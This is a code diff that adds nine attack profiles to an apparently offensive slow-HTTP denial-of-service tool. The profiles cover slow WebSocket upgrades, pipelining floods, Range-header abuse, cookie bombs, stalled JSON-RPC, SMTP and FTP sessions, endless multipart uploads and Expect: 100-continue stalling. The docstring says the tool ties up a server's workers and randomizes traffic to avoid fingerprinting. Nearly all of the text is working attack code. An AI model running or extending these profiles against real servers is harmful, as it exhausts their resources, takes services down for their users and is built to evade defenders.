@@ -10,6 +10,12 @@ vulnerable web server ties up a worker thread/process waiting on it:
                     chunks with pauses (slow-read / slow-bytes).
 * ``chunked``     - send POST with Transfer-Encoding: chunked and drip
                     small chunks without the terminating 0-chunk.
+* ``multipart-slow-upload`` - send a multipart/form-data POST and dribble
+                    MIME part bytes slowly, never emitting the closing
+                    boundary (exercises multipart parsers/temp-file handling).
+* ``expect-continue-abuse`` - send headers with ``Expect: 100-continue`` and
+                    stall the body after the interim response, keeping any
+                    state the server allocated on ``100 Continue`` pinned.
 
 Every connection randomizes its headers, User-Agent, path query and timing
 to make the traffic harder to fingerprint.
@@ -294,10 +300,346 @@ class Chunked(Profile):
             await _halt(stop, config)
 
 
+class WebSocketSlowUpgrade(Profile):
+    name = "websocket-slow-upgrade"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # WebSocket upgrade request with slow header sending
+        method = config.method or "GET"
+        headers = _base_headers(config, ua)
+        # Add WebSocket-specific headers
+        headers.append("Upgrade: websocket")
+        headers.append("Connection: Upgrade")
+        # Generate WebSocket key (random base64)
+        import base64
+        ws_key = base64.b64encode(secrets.token_bytes(16)).decode()
+        headers.append(f"Sec-WebSocket-Key: {ws_key}")
+        headers.append("Sec-WebSocket-Version: 13")
+        if random.random() < 0.5:
+            headers.append("Sec-WebSocket-Protocol: chat")
+
+        # Send request line
+        req = f"{method} {_path(config)} HTTP/1.1\r\n".encode()
+        await _write(writer, req, stats, config)
+
+        # Slowly send headers one by one
+        for header in headers:
+            if stop.is_set():
+                return False
+            await _write(writer, (header + "\r\n").encode(), stats, config)
+            await _halt(stop, config)
+
+        # Never send the terminating blank line to keep upgrade incomplete
+        while not stop.is_set():
+            # Continue sending random X-headers to keep connection alive
+            key = f"X-{_rand_hex(6)}"
+            value = _rand_hex(8)
+            await _write(writer, f"{key}: {value}\r\n".encode(), stats, config)
+            await _halt(stop, config)
+
+        return not stop.is_set()
+
+
+class HttpPipelining(Profile):
+    name = "http-pipelining"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Send multiple HTTP requests without waiting for responses
+        method = config.method or "GET"
+        headers = _base_headers(config, ua)
+        req = (
+            f"{method} {_path(config)} HTTP/1.1\r\n"
+            + "\r\n".join(headers)
+            + "\r\n\r\n"
+        ).encode()
+
+        # Send multiple requests in pipeline
+        request_count = 0
+        while not stop.is_set() and request_count < 50:  # Limit to 50 requests per connection
+            await _write(writer, req, stats, config)
+            request_count += 1
+            # Small delay between requests to keep connection alive
+            await _halt(stop, config)
+
+        return not stop.is_set()
+
+
+class RangeHeaderAbuse(Profile):
+    name = "range-abuse"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Send many byte range requests to exhaust file handle limits
+        method = config.method or "GET"
+        request_count = 0
+        while not stop.is_set() and request_count < 100:  # Limit to 100 range requests per connection
+            headers = _base_headers(config, ua)
+            # Add random Range header
+            start = random.randint(0, 1000000)
+            end = start + random.randint(100, 10000)
+            headers.append(f"Range: bytes={start}-{end}")
+
+            req = (
+                f"{method} {_path(config)} HTTP/1.1\r\n"
+                + "\r\n".join(headers)
+                + "\r\n\r\n"
+            ).encode()
+
+            await _write(writer, req, stats, config)
+            request_count += 1
+            # Small delay between requests
+            await _halt(stop, config)
+
+        return not stop.is_set()
+
+
+class CookieBomb(Profile):
+    name = "cookie-bomb"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Send extremely large cookies to exhaust cookie parsing memory
+        method = config.method or "GET"
+        headers = _base_headers(config, ua)
+
+        # Generate large cookie value (10KB for testing, can be larger in production)
+        cookie_size = 10 * 1024  # 10KB (reduced from 1MB for test performance)
+        cookie_value = "".join(random.choice(_ALNUM) for _ in range(cookie_size))
+        cookie_name = "bomb_cookie"
+
+        # Replace existing cookie if present, or add new one
+        headers = [h for h in headers if not h.lower().startswith("cookie:")]
+        headers.append(f"Cookie: {cookie_name}={cookie_value}")
+
+        req = (
+            f"{method} {_path(config)} HTTP/1.1\r\n"
+            + "\r\n".join(headers)
+            + "\r\n\r\n"
+        ).encode()
+
+        await _write(writer, req, stats, config)
+
+        # Keep connection alive with periodic keep-alive headers
+        while not stop.is_set():
+            await _halt(stop, config)
+            # Send small keep-alive data to maintain connection
+            if random.random() < 0.1:  # 10% chance to send keep-alive
+                await _write(writer, b"X-Keep-Alive: 1\r\n", stats, config)
+
+        return not stop.is_set()
+
+
+class JsonRpcSlow(Profile):
+    name = "jsonrpc-slow"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Slowly send JSON-RPC payloads
+        method = config.method or "POST"
+        headers = _base_headers(config, ua)
+        headers.append("Content-Type: application/json")
+
+        # Generate JSON-RPC payload (partial, never completed)
+        json_payload = '{"jsonrpc":"2.0","method":"slow_method","params":['
+        json_length = len(json_payload)
+
+        headers.append(f"Content-Length: {json_length + 1000}")  # Claim larger size
+        req = (
+            f"{method} {_path(config)} HTTP/1.1\r\n"
+            + "\r\n".join(headers)
+            + "\r\n\r\n"
+        ).encode()
+
+        await _write(writer, req, stats, config)
+
+        # Slowly send JSON payload character by character
+        sent = 0
+        while not stop.is_set() and sent < len(json_payload):
+            await _write(writer, json_payload[sent:sent+1].encode(), stats, config)
+            sent += 1
+            await _halt(stop, config)
+
+        # Continue sending partial JSON data without completion
+        while not stop.is_set():
+            await _write(writer, b'"param",', stats, config)
+            await _halt(stop, config)
+
+        return not stop.is_set()
+
+
+class SmtpSlowEnvelope(Profile):
+    name = "smtp-slow-envelope"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Slowly send SMTP envelope commands
+        # SMTP operates on different ports, but we'll use the configured port
+        smtp_commands = [
+            f"EHLO {config.header_host}",
+            "MAIL FROM: <slow-test@example.com>",
+            "RCPT TO: <recipient@example.com>",
+        ]
+
+        for cmd in smtp_commands:
+            if stop.is_set():
+                return False
+            await _write(writer, (cmd + "\r\n").encode(), stats, config)
+            await _halt(stop, config)
+
+        # Never send DATA command to keep envelope incomplete
+        while not stop.is_set():
+            # Continue sending incomplete RCPT TO commands
+            await _write(writer, b"RCPT TO: <another@example.com>\r\n", stats, config)
+            await _halt(stop, config)
+
+        return not stop.is_set()
+
+
+class FtpSlowCommand(Profile):
+    name = "ftp-slow-command"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Slowly send FTP commands
+        ftp_commands = [
+            "USER anonymous",
+            "PASS test@example.com",
+            "PASV",
+        ]
+
+        for cmd in ftp_commands:
+            if stop.is_set():
+                return False
+            await _write(writer, (cmd + "\r\n").encode(), stats, config)
+            await _halt(stop, config)
+
+        # Never complete data transfer
+        while not stop.is_set():
+            # Continue sending PASV commands
+            await _write(writer, b"PASV\r\n", stats, config)
+            await _halt(stop, config)
+
+        return not stop.is_set()
+
+
+def _multipart_boundary() -> str:
+    """Random 24-character multipart boundary (alphanumeric only)."""
+    return "".join(random.choice(_ALNUM) for _ in range(24))
+
+
+class MultipartSlowUpload(Profile):
+    name = "multipart-slow-upload"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Multipart uploads exercise a different parser/handling path than the
+        # opaque bodies sent by slow-post/chunked (boundary scanning, part
+        # buffering, temp-file handling on real upload endpoints). Emit the
+        # headers line by line, then dribble MIME-part content forever,
+        # withholding the closing boundary so the upload never completes.
+        boundary = _multipart_boundary()
+        ctype = f"multipart/form-data; boundary=----WebKitFormBoundary{boundary}"
+
+        headers = _base_headers(config, ua)
+        # `--header Expect:...` must not leak into multipart (it would turn
+        # the upload into an expect/continue transaction), mirroring Rust.
+        headers = [
+            h for h in headers if h.split(":", 1)[0].strip().lower() != "expect"
+        ]
+        headers.append(f"Content-Type: {ctype}")
+        headers.append(f"Content-Length: {config.base_post_length}")
+        lines = [f"{config.method or 'POST'} {_path(config)} HTTP/1.1"] + headers
+        while lines and not stop.is_set():
+            await _write(writer, (lines.pop(0) + "\r\n").encode(), stats, config)
+            await _halt(stop, config)
+        if stop.is_set():
+            return False
+        await _write(writer, b"\r\n", stats, config)
+        if stop.is_set():
+            return False
+
+        # A realistic file-upload preamble, then endless slow part content
+        # with only non-closing boundaries so the body never terminates.
+        prelude = (
+            f"------WebKitFormBoundary{boundary}\r\n"
+            'Content-Disposition: form-data; name="upload"; '
+            f'filename="{_rand_token(10)}.bin"\r\n'
+            "Content-Type: application/octet-stream\r\n\r\n"
+        ).encode()
+        await _write(writer, prelude, stats, config)
+        part = 0
+        while not stop.is_set():
+            await _write(writer, _dribble(), stats, config)
+            part += 1
+            if part % 64 == 0:
+                # Emit a fresh non-final boundary every so often: it keeps
+                # multipart parsers scanning and buffering without ever
+                # signalling the end of the upload.
+                chunk = (
+                    f"\r\n------WebKitFormBoundary{boundary}\r\n"
+                    f'Content-Disposition: form-data; name="field{part}"\r\n'
+                    "\r\n"
+                ).encode()
+                await _write(writer, chunk, stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class ExpectContinueAbuse(Profile):
+    name = "expect-continue-abuse"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Announce a body with `Expect: 100-continue`, consume the interim
+        # response if the server sends one, then stall the body itself. Any
+        # state the server allocated on its `100 Continue` decision (worker,
+        # upload buffer) stays pinned while the connection is held open.
+        length = random.randint(config.base_post_length // 2, config.base_post_length)
+
+        headers = _base_headers(config, ua)
+        headers.append("Content-Type: application/x-www-form-urlencoded")
+        headers.append(f"Content-Length: {length}")
+        # A caller-supplied `Expect:` (via --header) wins over the default,
+        # mirroring the Rust backend (no duplicate lines either way).
+        lowered = [h.split(":", 1)[0].strip().lower() for h in headers]
+        if "expect" not in lowered:
+            headers.append("Expect: 100-continue")
+        req = (
+            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
+            + "\r\n".join(headers)
+            + "\r\n\r\n"
+        ).encode()
+        await _write(writer, req, stats, config)
+        # Give the server a beat to answer with `100 Continue` (or a final
+        # rejection); consume whatever arrived without blocking past the
+        # configured read deadline, then keep the promised body stalled.
+        try:
+            interim = await asyncio.wait_for(reader.read(1024), timeout=config.connect_timeout)
+        except TimeoutError:
+            interim = b""
+        if interim:
+            stats.bytes_received += len(interim)
+        if stop.is_set():
+            return False
+
+        sent = 0
+        while not stop.is_set() and sent < length:
+            await _write(writer, _dribble(), stats, config)
+            sent += 1
+            await _halt(stop, config)
+        # Even after the announced byte count is exhausted, hold the socket
+        # open instead of closing it.
+        while not stop.is_set():
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
 PROFILES: dict[str, type[Profile]] = {
     SlowPost.name: SlowPost,
     SlowPostHeaders.name: SlowPostHeaders,
     SlowHeaders.name: SlowHeaders,
     SlowRead.name: SlowRead,
     Chunked.name: Chunked,
+    WebSocketSlowUpgrade.name: WebSocketSlowUpgrade,
+    HttpPipelining.name: HttpPipelining,
+    RangeHeaderAbuse.name: RangeHeaderAbuse,
+    CookieBomb.name: CookieBomb,
+    JsonRpcSlow.name: JsonRpcSlow,
+    SmtpSlowEnvelope.name: SmtpSlowEnvelope,
+    FtpSlowCommand.name: FtpSlowCommand,
+    MultipartSlowUpload.name: MultipartSlowUpload,
+    ExpectContinueAbuse.name: ExpectContinueAbuse,
 }
